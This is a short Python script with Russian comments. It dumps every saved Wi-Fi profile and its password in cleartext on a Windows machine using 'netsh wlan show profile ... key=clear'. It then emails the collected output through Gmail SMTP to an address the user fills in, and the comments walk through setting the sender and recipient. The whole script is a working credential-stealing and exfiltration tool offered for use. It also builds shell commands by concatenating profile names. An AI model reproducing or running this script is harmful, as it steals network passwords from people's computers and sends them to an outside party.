import subprocess
import smtplib
import re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login('@gmail.com', 'pass')# авторизация. 1ый параметр - ваш адрес, 2ой - пароль от вашего адреса электронной почты, с это почты и будет отправлено письмо
    server.sendmail('@gmail.com', '@gmail.com', message)  # отправка сообщения. 1ый параметр - с какого адреса будет отправлено письмо(указывайте тот, с которого проводили авторизацию), 2ой параметр - адрес на который придёт письмо и 3ий параметр - переменная с содержимым сообщения
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True, text=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"  # Исправленная команда
    current_result = subprocess.check_output(command, shell=True, text=True)  # Исправленное выполнение команды
    result = result + current_result

send_mail("@gmail.com", "@gmail.com", result) # 1ый параметр - с какого адреса будет отправлено письмо(указывайте тот, с которого проводили авторизацию), 2ой параметр - адрес на который придёт письмо(указывайте свой адрес) и 3ий параметр - результат выполнения нашей программы.
